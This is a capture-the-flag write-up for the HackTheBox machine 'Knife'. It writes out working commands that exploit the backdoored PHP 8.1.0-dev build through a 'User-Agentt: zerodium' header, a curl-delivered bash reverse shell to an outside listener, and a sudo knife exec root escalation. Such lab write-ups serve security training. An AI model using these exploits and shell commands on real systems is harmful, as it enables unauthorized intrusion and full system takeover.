
# Knife

**Platform:** HackTheBox  
**OS:** Linux  
**Difficulty:** Easy  
**Date:** April 2026

---

## Summary

Linux machine running PHP 8.1.0-dev, a backdoored version of PHP 
uploaded to the official repository by malicious actors in 2021. 
The backdoor executes system commands via a special HTTP header. 
Privilege escalation achieved via sudo permissions on knife.

---

## 1. Reconnaissance

Port scan using nmap:

```bash
nmap -Pn -sCV -p- --top-ports 1000 -T3 10.129.20.82
```

**Open ports:**

| Port | Service |
|------|---------|
| 22 | SSH |
| 80 | HTTP |

---

## 2. PHP 8.1.0-dev Backdoor

Identified PHP version via Burp Suite response header:
X-Powered-By: PHP/8.1.0-dev

PHP 8.1.0-dev contains a backdoor introduced via a malicious commit 
to the official PHP repository. When a request contains the header 
`User-Agentt: zerodium`, PHP executes the value as a system command.

Confirmed RCE:

```bash
curl -v -H 'User-Agentt: zerodiumsystem("ls");' http://10.129.20.82/
```

---

## 3. Reverse Shell

Started listener:

```bash
nc -lvnp 4444
```

Executed reverse shell via backdoor:

```bash
curl -s -H 'User-Agentt: zerodiumsystem("bash -c '"'"'bash -i >& /dev/tcp/10.10.15.207/4444 0>&1'"'"'");' http://10.129.20.82/
```

Received shell as **james**.

Retrieved user flag:

```bash
cat /home/james/user.txt
```

---

## 4. Privilege Escalation

Checked sudo permissions:

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/knife
```

Spawned root shell via knife:

```bash
sudo /usr/bin/knife exec -E 'exec "/bin/sh"'
whoami
# root
```

Retrieved root flag:

```bash
cat /root/root.txt
```

---

## 5. Flags

- user.txt ✅
- root.txt ✅

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port and service enumeration |
| Burp Suite | HTTP header analysis |
| curl | Backdoor exploitation |
| netcat | Reverse shell listener |

---

## Vulnerabilities Found

| Vulnerability | Description |
|--------------|-------------|
| PHP 8.1.0-dev Backdoor | RCE via User-Agentt zerodium header |
| sudo Misconfiguration | knife allowed as root via sudo |
